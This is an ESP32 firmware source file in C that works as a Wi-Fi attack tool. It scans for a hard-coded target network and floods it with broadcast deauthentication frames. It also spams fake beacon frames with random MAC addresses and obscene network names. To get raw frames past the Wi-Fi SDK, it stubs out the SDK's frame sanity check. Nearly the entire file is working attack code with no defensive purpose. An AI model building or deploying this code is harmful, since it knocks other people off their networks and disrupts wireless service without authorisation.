#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_log_level.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_wifi_default.h"
#include "esp_netif_defaults.h"
#include "esp_random.h"
// configuration
#define TARGET_SSID "chuer(16)"
#define LED_PIN 2
#define DEAUTH_ONLY_PIN 21
#define BEACON_SPAM_ONLY_PIN 19
#define DUEL_ATTACK_PIN 18

uint8_t mode = 0;
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}
#define TAG "Beacon_Spammer"
static const char* beacon_name[] = {
    "sh1t","fuckyou",TARGET_SSID,"LLL","ERROR","exception","b1tch","d1ck"
};
// beacon frame definition
static uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  
    // Fixed parameters
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
    /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation
  
    // Tagged parameters
  
    // SSID parameters
    /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, // SSID
  
    // Supported Rates
    /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
    /* 72 */ 0x82, // 1(B)
    /* 73 */ 0x84, // 2(B)
    /* 74 */ 0x8b, // 5.5(B)
    /* 75 */ 0x96, // 11(B)
    /* 76 */ 0x24, // 18
    /* 77 */ 0x30, // 24
    /* 78 */ 0x48, // 36
    /* 79 */ 0x6c, // 54
  
    // Current Channel
    /* 80 - 81 */ 0x03, 0x01, // Channel set, length
    /* 82 */      0x01,       // Current Channel
  
    // RSN information
    /*  83 -  84 */ 0x30, 0x18,
    /*  85 -  86 */ 0x01, 0x00,
    /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
    /*  91 -  92 */ 0x02, 0x00,
    /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
    /* 101 - 102 */ 0x01, 0x00,
    /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
    /* 107 - 108 */ 0x00, 0x00
  };
void beacon_spam_task(void *arg) {
    ESP_LOGI(TAG,"Starting beacon spammer");
    char name_buffer[32];
    char suffix_buffer[16];
    while(1){
        strcpy((char *)beaconPacket +38, "");
        for(int i = 0; i < 6; i++)
            beaconPacket[10+i] = esp_random() % 256;
        memcpy(beaconPacket +16, beaconPacket + 10,6);
        suffix_buffer[0] = '-';
        for(int i = 1; i < 15; i++)
            suffix_buffer[i] = esp_random() % 127 + 48;
        suffix_buffer[15] = 0;
        strcpy(name_buffer, beacon_name[esp_random() % 8]);
        strcat(name_buffer, suffix_buffer);
        memcpy(beaconPacket +38, name_buffer, strlen(name_buffer));
        beaconPacket[37] = strlen(name_buffer);
        beaconPacket[82] = beaconPacket[82] % 14 + 1;
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 109, 0);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 109, 0);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}
void start_beacon_spam_task() {
    xTaskCreate(&beacon_spam_task, "beacon_spam_task", 4096, NULL, 5, NULL);
}
#define TAG "WiFi_Attacker"
static uint8_t deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}
void wifi_deauth_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = pvParameters;
    memcpy(deauth_frame + 10, ap_record->bssid, 6);
    memcpy(deauth_frame + 16, ap_record->bssid, 6);
    ESP_LOGI(TAG,"Built deauth frame");
    wifi_config_t wifi_config = {
        .ap = {
            .password = "5b5f0dd368e080baa8d8ce197cff8c03fdaf9a2d4c9a2f647e8b5b015f5b3311",
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .ssid_len = strlen(TARGET_SSID),
            .max_connection = 1,
        },
        .sta = {
            .ssid = TARGET_SSID,
        }
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    vPortFree(ap_record);
    ap_record = NULL;
    ESP_LOGI(TAG, "Started AP");
    while(1)
    {
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
        ESP_LOGI(TAG, "Sent deauth packet");
        vTaskDelay(pdMS_TO_TICKS(800));
    }
}
void start_deauth_task(wifi_ap_record_t *ap_info) {
    wifi_ap_record_t *ap_record = pvPortMalloc(sizeof(wifi_ap_record_t));
    memcpy(ap_record, ap_info, sizeof(wifi_ap_record_t));
    xTaskCreate(&wifi_deauth_task, "wifi_deauth_task", 4096, ap_info, 5, NULL);
    ESP_LOGI(TAG, "Started deauth task");
}
#define TAG "WiFi_Scanner"
void wifi_scan_task(void *arg) {
    wifi_scan_config_t scan_config = {
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    };
    bool running = true;
    while (running) {
        gpio_set_level(LED_PIN, 1);
        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
        ESP_LOGI(TAG, "Scanned");
        uint16_t ap_count = 0;
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
        wifi_ap_record_t *ap_record = pvPortMalloc(sizeof(wifi_ap_record_t));
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_record));
        if(ap_count){
            for(int i = 0; i < ap_count; i++)
            {
                if(!strcmp((char *)ap_record[i].ssid, TARGET_SSID))
                {
                    wifi_ap_record_t ap_record_buffer;
                    memcpy(&ap_record_buffer, &ap_record[i], sizeof(wifi_ap_record_t));
                    start_deauth_task(&ap_record_buffer);
                    vTaskDelay(pdMS_TO_TICKS(1000));
                    if(mode==3)
                    {
                        start_beacon_spam_task();
                    }
                }
            }
            running = false;
        }
        else{
            ESP_LOGI(TAG,"Target not found");
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
        vPortFree(ap_record);
    }
}
#define TAG "main"
__always_inline void wifi_init() {
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    esp_netif_create_default_wifi_sta();
    esp_netif_create_default_wifi_ap();
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
}
__always_inline void gpio_init() { 
    {
        gpio_config_t io_conf = {
            .intr_type = GPIO_INTR_DISABLE,
            .mode = GPIO_MODE_OUTPUT,
            .pin_bit_mask = (1ULL << LED_PIN),
            .pull_down_en = GPIO_PULLDOWN_DISABLE,
            .pull_up_en = GPIO_PULLUP_DISABLE
        };
        ESP_ERROR_CHECK(gpio_config(&io_conf));
    }

    // DEAUTH_ONLY_PIN 配置
    {
        gpio_config_t io_conf = {
            .intr_type = GPIO_INTR_DISABLE,
            .mode = GPIO_MODE_INPUT,
            .pin_bit_mask = (1ULL << DEAUTH_ONLY_PIN),
            .pull_down_en = GPIO_PULLDOWN_ENABLE,
            .pull_up_en = GPIO_PULLUP_DISABLE
        };
        ESP_ERROR_CHECK(gpio_config(&io_conf));
    }

    // BEACON_SPAM_ONLY_PIN 配置
    {
        gpio_config_t io_conf = {
            .intr_type = GPIO_INTR_DISABLE,
            .mode = GPIO_MODE_INPUT,
            .pin_bit_mask = (1ULL << BEACON_SPAM_ONLY_PIN),
            .pull_down_en = GPIO_PULLDOWN_DISABLE,
            .pull_up_en = GPIO_PULLUP_ENABLE
        };
        ESP_ERROR_CHECK(gpio_config(&io_conf));
    }

    // DUEL_ATTACK_PIN 配置
    {
        gpio_config_t io_conf = {
            .intr_type = GPIO_INTR_DISABLE,
            .mode = GPIO_MODE_INPUT,
            .pin_bit_mask = (1ULL << DUEL_ATTACK_PIN),
            .pull_down_en = GPIO_PULLDOWN_DISABLE,
            .pull_up_en = GPIO_PULLUP_ENABLE
        };
        ESP_ERROR_CHECK(gpio_config(&io_conf));
    }
}
void app_main() {
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_LOGI(TAG, "Initialized NVS");

    esp_event_loop_create_default();
    ESP_LOGI(TAG, "Initialized event loop");

    wifi_init();
    ESP_LOGI(TAG, "Initialized WiFi");

    gpio_init();
    ESP_LOGI(TAG, "Initialized GPIO");
    ESP_LOGI(TAG, "Initialization completed");
    if(gpio_get_level(BEACON_SPAM_ONLY_PIN) == 0){
        mode = 1;
        start_beacon_spam_task();
    }
    else if(gpio_get_level(DEAUTH_ONLY_PIN) == 0){
        mode = 2;
        xTaskCreate(&wifi_scan_task, "wifi_scan_task", 4096, NULL, 5, NULL);
    }
    else if(gpio_get_level(DUEL_ATTACK_PIN) == 0){
        mode = 3;
        xTaskCreate(&wifi_scan_task, "wifi_scan_task", 4096, NULL, 5, NULL);
    }
    gpio_reset_pin(BEACON_SPAM_ONLY_PIN);
    gpio_reset_pin(DEAUTH_ONLY_PIN);
    gpio_reset_pin(DUEL_ATTACK_PIN);
}